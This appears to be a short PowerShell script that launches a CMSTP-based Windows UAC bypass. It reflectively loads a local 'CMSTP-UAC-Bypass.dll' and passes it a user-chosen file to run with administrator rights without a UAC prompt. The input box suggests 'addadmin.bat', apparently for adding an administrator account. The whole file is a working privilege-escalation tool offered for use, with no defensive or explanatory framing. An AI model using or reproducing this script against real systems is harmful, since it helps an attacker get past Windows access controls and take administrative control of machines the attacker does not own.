"If this text is being displayed within a PowerShell window, follow the onscreen prompt."
""
"If you are instead seeing this inside of a text editor, please close the current window, right click this file, and click 'Run with PowerShell' to open."


$executingScriptDirectory = Split-Path -Path $MyInvocation.MyCommand.Definition -Parent
$addadminpath = Join-Path $executingScriptDirectory "addadmin.bat"



[void][System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
$floc = [Microsoft.VisualBasic.Interaction]::InputBox("Enter location of the file you would like to run as admin and click OK.

I suggest using the 'addadmin.bat' file inside this folder.", "UAC Protected File Bypass", "$addadminpath")

[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
[CMSTPBypass]::Execute($floc)